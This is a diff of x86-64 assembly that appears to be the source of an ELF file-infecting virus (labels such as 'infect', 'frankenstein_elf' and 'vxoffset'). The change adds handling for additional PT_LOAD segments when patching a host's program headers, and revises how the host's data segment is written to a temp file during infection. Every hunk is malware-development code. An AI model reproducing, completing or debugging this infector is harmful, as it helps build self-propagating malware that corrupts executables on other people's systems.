@@ -409,6 +409,8 @@ oshoff: dq 0
 hostentry_offset: dd 0
 hosttext_start: dd 0
 
+intermediary_ptload_segment_offset: dq 0
+
 data_offset_new_padding: dd 0
 data_offset_og: dd 0
 data_offset_original: dq 0
@@ -926,8 +928,8 @@ infect:
 				je .mod_phdr_text_segment			
 				cmp dword [r13 + r12 + elf_phdr.p_flags], PFLAGS_RW
 				je .mod_phdr_data_segment			
-				jne .mod_subsequent_phdr
-				;jne .mod_other_ptload_phdr
+				;jne .mod_subsequent_phdr
+				jne .mod_other_ptload_phdr
 				.mod_phdr_text_segment:			
 					;mov rdx, checkphdrRXpasslen
 					;lea rsi, checkphdrRXpass
@@ -968,8 +970,15 @@ infect:
 					;add dword r10d, [PAGESIZE]
 					;mov dword [r13 + r12 + elf_phdr.p_paddr], r10d
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing
-				;.mod_other_ptload_phdr:
-						
+				.mod_other_ptload_phdr:
+					mov r11, [r13 + r12 + elf_phdr.p_offset]
+					cmp r11d, [vxoffset]
+					jl .next_phdr
+					mov r10, qword [intermediary_ptload_segment_offset]
+					cmp r10, 0
+					jne .next_phdr
+					mov qword [intermediary_ptload_segment_offset], r11
+					jmp .mod_subsequent_phdr			
 			.mod_subsequent_phdr:
 				xor r11, r11
 				mov r11d, [vxoffset]
@@ -1184,24 +1193,28 @@ frankenstein_elf:
 		;mov rsi, qword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
+;		jmp .close_temp
 
 	.write_datasegment_totemp:
+		xor r10, r10
 		mov rdx, qword [oshoff]
 		;mov rdx, qword [r14 + 48] 	;filestat.st_size
 		;sub edx, dword [vxoffset]
 		;sub edx, dword [data_offset_og]
-		sub edx, dword [evaddr]
+		;sub edx, dword [evaddr]
+		sub edx, dword [intermediary_ptload_segment_offset]
 		;sub edx, dword [data_offset_original]
 		;lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
 		lea rsi, [r13]							;r13 contains pointer to mmap'd file
 		;add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
-		add rsi, qword [evaddr]					;adjust rsi address to point to original data segment offset of mmap'd file
+		;add rsi, qword [evaddr]					;adjust rsi address to point to original data segment offset of mmap'd file
+		add rsi, qword [intermediary_ptload_segment_offset]
 		;mov r10d, dword [data_offset_new_padding]
 		mov r10d, dword [vx_padding_size]
 		;mov r10d, dword [vxdatasegment]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp
+		jmp .close_temp
 
 	.write_patched_shdrs_totemp:
 ;		mov rdx, qword [oshoff]
